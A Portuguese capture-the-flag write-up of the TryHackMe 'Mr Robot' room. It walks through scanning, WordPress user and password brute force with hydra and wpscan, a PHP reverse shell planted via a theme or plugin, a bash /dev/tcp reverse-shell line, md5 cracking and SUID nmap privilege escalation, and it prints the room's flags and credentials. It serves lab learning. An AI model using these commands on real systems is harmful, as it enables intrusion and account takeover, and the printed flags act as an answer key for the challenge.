# 🏆 Mr Robot - WriteUp

\-- documentações ainda em revisão -- video gravado



ultima flag;

<figure><img src="../../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>



notas - desorganizado;



tryhackme.com/room/mrrobot

escaneamento do IP gerado pela plataforma sudo nmap -sS 10.10.70.104 ou sudo nmap -sS -sV -p22,80,443 10.10.70.104

veremos web server 80/tcp e 443/tcp apache http server

\-> ir no site pelo navegador e explorar -> ver q n temos permissão

(sudo nmap -sV -sC -oA scans/initial 10.10.70.104 -> (less scans/initial.nmap)

podemos usar programas para scannear diretorios -> dirb, dirsearch, dirbuster

gobuster dir -u http://10.10.70.104 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt (pode salvar isso em um arquivo .txt com -o pasta/nome.txt)

dirsearch -u http://10.10.70.104

ver os resultados dos diretórios /wp-includes /wp-login .. - detectar wordpress com wp-... rodar wpscan no site -> wpscan --url http://10.10.70.104

ver o robots.txt

achar o arquivo com a primeira flag; http://10.10.70.104/key-1-of-3.txt 073403c8a58a1f80d943455fb30724b9

baixar o arquivo dicionário (.dic)

cat no arquivo -> muitas palavras -> organizar e tirar possíveis duplicados cat fsocity.dic | sort | uniq > fsociety.dic

wpscan -e --url http://10.10.70.104 (enumerar os usuarios -> dará error) -> fazer brute force dos usuarios

poderiamos até testar '/wp-json/wp/v2/users/' para tentar enumerar

Testar o login e ver q ele diz o q está errado;

Poderemos perceber que no login dirá qual credencial está errada, além de que não somos bloqueados por diversas tentativas de login, sendo possível achar algum usuário válido através de força bruta. Usando proxy/burp para interceptar a tentativa de login, podemos capturar o que temos no body da requisição POST para login, assim poderemos fazer um bruteforce para tentar essa requisição várias vezes para vários usuários diferentes. O 'código' capturado começaria mais ou menos dessa forma (para admin:admin) log=admin\&pwd=admin Assim, podemos usar o hydra para um brute-force colocando o usuário e a senha como uma variável para ele ir substituindo. log=^USER^\&pwd=^PASS^ (n fazer essa etapa junto com gobuster) Usando o hydra para fazer força bruta com método post do http;

\-L -> indicar wordlist de usuário; -l -> indicar usuário; -p -> indicar senha; -P -> indicar wordlist de senha; IP da maquina-site alvo -> Indicando alvo; http-post-form -> Indica o tipo/metodo; Página de login + CorpoDaRequisição + Erro para filtrar => Aqui vc coloca o /wp-login.php seguido de dois pontos e coloca o corpo da requisição com as variáveis, seguido de mais dois pontos e a string de erro de usuário inválido Assim, você vai estar falando onde ocorre o login, qual o corpo da requisição e como mais ou menos é a string da mensagem caso a tentativa esteja errada (assim, qnd der algo diferente será filtrado como um resultado que deu certo).

hydra -L fsociety.dic -p senha 10.10.70.104 http-post-form "/wp-login.php:log=^USER^\&pwd=^PASS^:Invalid username" -t 30 -V (tentando achar o nome pela wordlist)

Ao acharmos o nome que funciona, podemos testar no login da página e veremos que a mensagem de erro foi alterada. Agora, se formos utilizar o hydra novamente, poderemos colocar parte da mensagem de erro nova, alterarmos o parâmetro para a wordlist ser testada na senha com o nome que descobrimos anteriormente.

hydra -l elliot -P fsociety.dic 10.10.70.104 http-post-form "/wp-login.php:log=^USER^\&pwd=^PASS^:The password you entered for the username" -t 30 -V

ou podemos ainda utilizar o WPSCAN para fazer o bruteforce na plataforma, por ser wordpress. Comigo foi mais rápido através do WPScan, portando:

wpscan --url 10.10.70.104 --paswords fsociety.dic --usernames elliot

Agora, basta logar ao achar a senha; login: Elliot password: ER28-0652

Uma vez dentro do wordpress como usuário ADM Elliot, podemos fazer edição do tema para colocar um código malicioso para nos garantir acesso ao server. Ou seja, podemos editar o tema para nossa reverse-shell, podemos add e ativar um pluguin que possua nosso codigo malicioso ou até mesmo editar um plugin para executar algo. Antes, precisamos estabelecer uma conexão com nossa máquina e podemos fazer isso através do netcat;

nc -lvp 53

Vale falar que você pode colocar a porta que preferir, eu geralmente utilizo 53, 4444 ou 1234 por costume. A 53 acaba por ser boa muitas das vezes, por ser uma porta de dns e isso faz com que ela seja 'raramente' bloqueada por firewall.

(outras opções de uso - use o HELP do programa para ajudar e entender melhor o comando) nc -lvnp 53 nc -lp1234 -vv nc -lvnp 53 -vv rlwrap nc -lvnp 53 nc -lnp53 -vv

Agora, vamos para a parte da ação dentro do wordpress. Podemos utilizar o 'php-rever-shell' que temos no kali: "/usr/share/webshells/php/php-reverse-shell.php" e colocar nosso IP e PORTA, depois add este codigo como um novo plugin e ativar ele na lista de plugins.

oou;;; copiar todo seu codigo php-reverse-shell ( podendo ser o do 'pentestmonkey' ) e editar uma página específica para colar o seu código dentro. Por exemlo, substituindo o código dentro do archives.php ou do 404 template. -- Não esquecer de colocar o IP da máquina e a porta no código. Ao fazer o update do arquivo, podemos até ir em 10.10.70.104/wp-content/themes/twentyfifteen/archive.php

oouu;;; podemos editar um plugin que é utilizado e ativá-lo se necessário, colocando o código abaixo em alguma parte estratégica que fará sua execução: exec("/bin/bash -c 'bash -i > /dev/tcp/$meuIP/$PortaNC 0>&1'"); -> colocar isso na edição de algum plugin, como Hello.

\--- resumindo;.

opções de php-reverse-shell -> com add um novo plugin com codigo pgp malicioso para aplicar dps que tiver ouvindo com netcat; editar uma pagina php com o codigo de uma maliciosa, como fizemos editar plugin conhecido como o hello, plugin q fica digitando colocando versos da letra da musica do louis armstrong em cada pagina

***

Pronto -> agr podemos ver que na tela do NC que estava ouvindo, já teve conexão.

uma vez conectado; podemos fzr alguns comandos simples, como: whoami hostname

ls /home cd /home/robot ls -la -> ver que apenas o usuário robot pode ler o arquivo da flag --> perceber o arquivo password md5 -> ver a senha decriptando a hash md5 --> podemos verificar se é, de fato, uma hash md5 com o hash-identifier (é mesmo) ---> quebrar a hash online ou por comando ----> daq a pouco, vamos poder perceber que não temos interação total com o shell.

cat password.raw-md5 c3fcd3d76192e4007dfb496cca67e13b

\--quebrando hash podemos usar o john the ripper para quebrar a md5 ou quebrar online.

(em outra sessao do terminal) salvar a hash num arquivo -> md5.hash ou md5.txt john md5.hash --wordlist=fsociety.dic --format=Raw-MD5 ou john --format=Raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt md5.txt ou hashcat 'c3fcd3d76192e4007dfb496cca67e13b' /usr/share/wordlists/rockyou.txt --force ou usar plataformas online que quebram, como https://crackstation.net/ que quebrou perfeitamente a hash. Site mais recomendado: https://hashes.com/en/decrypt/hash

veremos que a hash md5 era: abcdefghijklmnopqrstuvwxyz cryptool: abcdefghijklmnopqrstuvwxyz -> c3fcd3d76192e4007dfb496cca67e13b

\-- Agora que sabemos a senha, podemos tentar trocar de usuário, certo? Porém, vai dar um erro de que precisa ser feito por um terminal. Não estamos tendo interação com um terminal e se quisermos usar o comando 'switch user' (su) precisamos de tal interação. Para isso, vamos precisar usar python para nos ajudar a 'gerar' o nosso pseudo terminal

whereis python

<figure><img src="../../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

python -c 'import pty;pty.spawn("/bin/bash")'

```
	A biblioteca pty em Python é usada para criar e manipular terminais pseudônicos, que são terminais virtuais que o sistema operacional fornece para permitir a interação com programas como se estivessem sendo executados em um terminal real.
	O método pty.spawn("/bin/bash") é usado para criar um novo processo de terminal pseudônico e iniciar o programa especificado, neste caso "/bin/bash", que é o shell bash. Isso efetivamente dá ao programa a sensação de estar sendo executado em um terminal real, mesmo que esteja sendo executado em um ambiente sem terminal.
```

agora que temos uma shell totalmente interativa, vamos poder usar o comando `su -l`, por exemplo.

su robot digitar a senha: abcdefghijklmnopqrstuvwxyz

agr q conseguimos acesso, podemos ver a flag. cat key-2-of-3.txt 822c73956184f694993bede3eb39f959

agr vamos tentar a elevação de privilégio, visto q a ultima flag esta na pasta root. Vai ser necessário tentarmos achar todos os arquivos que tem bit suid nessa maquina, ou seja, arquivos que possuem permissões elevadas para determinadas funcionalidades. Em resumo, SUID permission te da permissões elevadas para certas coisas em certos momentos. (Um exemplo de quando setamos um "setuid bit" é quando usamos o 'chmod +x script.sh') -> verificar

Para fazermos essa varredura, podemos utilizar o comando find para tentar achar tudo;

find / -perm -4000 2>/dev/null

Podemos até filtrar pelos binários, para facilitar, com grep.

find / -perm +6000 2>/dev/null | grep '/bin/'

Acharemos o nmap, que possui bitsuid ativado. a versão 3.81 rodando do nmap nessa maquina permite o parametro --interactive. achamos o que pode nos dar acesso ao root de fato.

/usr/local/bin/nmap --interactive ou nmap --interactive

Se verificarmos o comando "h" veremos que o "!" faz a gnt rodar um comando shell na máquina.

> h

Então, se digitarmos "!sh" iremos abrir uma shell.

!sh

## whoami

root cd /root ls -la

Agora foi! Achamos a última flag dentro da key-3-of-3.txt

cat key-3-of-3.txt 04787ddef27c3dee1ee161b21670b4e4

